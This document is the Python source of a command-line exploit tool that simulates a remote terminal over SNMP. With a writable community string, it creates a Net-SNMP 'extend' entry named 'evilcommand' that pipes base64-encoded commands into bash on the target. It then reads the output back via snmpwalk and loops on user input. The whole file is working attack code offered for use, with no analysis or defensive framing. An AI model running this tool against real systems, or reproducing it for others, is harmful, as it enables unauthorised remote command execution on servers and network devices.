from termcolor import colored
import os
import re
import base64
import click

# Click config
CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

delimiters = {"start": """NET-SNMP-EXTEND-MIB::nsExtendOutputFull."evilcommand" = STRING: """,
				"end": """NET-SNMP-EXTEND-MIB::nsExtendOutNumLines"""}

reg = """\]LEDEBUT\]([\s\S]*)\]LAFIN\]"""


@click.command(context_settings=CONTEXT_SETTINGS)
@click.argument('ip')
@click.option(
    '--communitystring', '-c',
    help='Community string for SNMP',
    default="private"
)
@click.option(
    '--version', '-v',
    help='SNMP version (1/2c/3)',
    default="2c"
)
@click.option(
    '--snmpset', '-ss',
    help='Path for the snmpset binary',
    default="/usr/bin/snmpset"
)
@click.option(
    '--snmpwalk', '-sw',
    help='Path for the snmpwalk binary',
    default="/usr/bin/snmpwalk"
)
def run(ip, communitystring, version, snmpset, snmpwalk):
	"""Simulates a terminal over Net-SNMP \"extend\" functionality.
	Be sure your SNMP Community String has write access."""
	com_str = communitystring

	def process(cmd):
		cmd = base64.b64encode(cmd.encode()).decode()
		os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"' = destroy > /dev/null""".format(snmpset, version, com_str, ip))
		os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"'  = createAndGo 'nsExtendCommand."evilcommand"' = /bin/bash 'nsExtendArgs."evilcommand"' = "-c \\\"echo {} | base64 -d | sh\\\"" > /dev/null""".format(snmpset, version, com_str, ip, cmd))
		output = os.system("""{} -v {} -c {} {} NET-SNMP-EXTEND-MIB::nsExtendObjects > /tmp/snmprce""".format(snmpwalk, version, com_str, ip))

		with open('/tmp/snmprce', 'r') as file:
			final = ""
			flag = False
			for line in file.readlines():
				if delimiters["start"] in line:
					flag = True
					final += line.replace(delimiters["start"], '')
					continue
				elif flag:
					if delimiters["end"] in line:
						break
					else:
						final += line
			return final

	try:
		output = process("echo -n ]LEDEBUT]$(whoami)[$(hostname)[$(pwd)]LAFIN]")
		prefixes = re.compile(reg).findall(output)[0].split("[")
		path = prefixes[2]
		prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
		print("")
	except IndexError:
			print("Error.\nBe sure your SNMP Community String has write access & your NET-SNMP target has \"extend\" functionality.")
			exit()
			
	try:
		while 1:
			text = input(prefix)
			if not text.strip():
				continue
			cmd = text.strip()
			cmd = "echo -n ']LEDEBUT]' ; cd {} && ".format(path) + cmd + " 2>&1 ; echo $(whoami)[$(hostname)[$(pwd) ; echo ']LAFIN]'"
			output = process(cmd)
			try:
				output = re.compile(reg).findall(output)[0].split('\n')
				prefixes = output.pop(len(output) - 2).split("[")
				path = prefixes[2]
				prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
				output = "\n".join(output)
				print(output)
			except IndexError:
				print("Error.\n")
	except KeyboardInterrupt:
		print(colored("\nGoodbye !", "cyan"))
		exit()
	
if __name__ == '__main__':
	run()
